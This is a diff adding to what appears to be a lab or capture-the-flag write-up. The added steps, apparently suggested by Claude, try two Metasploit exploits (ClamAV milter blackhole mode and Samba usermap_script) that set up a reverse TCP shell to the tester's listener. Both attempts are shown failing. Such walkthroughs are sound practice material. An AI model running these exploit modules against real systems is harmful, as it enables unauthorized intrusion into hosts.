@@ -316,6 +316,47 @@ Shellcodes: No Results
 
 ```
 
+Asking Claude...
+
+### Priority 1: ClamAV Milter blackhole-mode exploit (Metasploit)
+
+```sh
+msfconsole
+
+use exploit/unix/smtp/clamav_milter_blackhole
+set RHOSTS clamav
+set LHOST 192.168.49.52
+
+run
+
+<<EOF
+msf exploit(unix/smtp/clamav_milter_blackhole) > run
+[*] Started reverse TCP handler on 192.168.49.52:4444 
+[*] Exploit completed, but no session was created.
+EOF
+```
+
+Ok. This one fails. Let's move on.
+
+### Priority 2: Samba 3.0.14a
+
+```sh
+msfconsole
+
+use exploit/multi/samba/usermap_script
+set RHOSTS clamav
+set LHOST 192.168.49.52
+
+run
+
+<<EOF 
+msf exploit(multi/samba/usermap_script) > run
+[*] Started reverse TCP handler on 192.168.49.52:4444 
+[*] Exploit completed, but no session was created.
+EOF
+```
+
+This one also fails.
 
 ## Non-root access
 
